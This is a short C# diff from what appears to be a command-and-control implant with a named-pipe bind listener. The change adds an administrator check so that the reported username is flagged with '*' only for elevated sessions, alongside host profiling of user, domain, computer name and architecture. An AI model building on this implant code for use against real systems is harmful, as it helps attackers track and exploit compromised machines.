@@ -38,6 +38,13 @@ public class Program
 		Sharp();
 	}
 
+    static bool ihInteg()
+    {
+        System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+        System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
+        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+    }
+    
 	private static void PbindConnect()
     {
         PipeSecurity pipeSecurity = new PipeSecurity();
@@ -75,7 +82,9 @@ public class Program
                         {
                             u = Environment.UserName;
                         }
-                        u += "*";
+                        if (ihInteg()) {
+                            u += "*";    
+                        }                        
                         var dn = Environment.UserDomainName;
                         var cn = Environment.GetEnvironmentVariable("COMPUTERNAME");
                         var arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
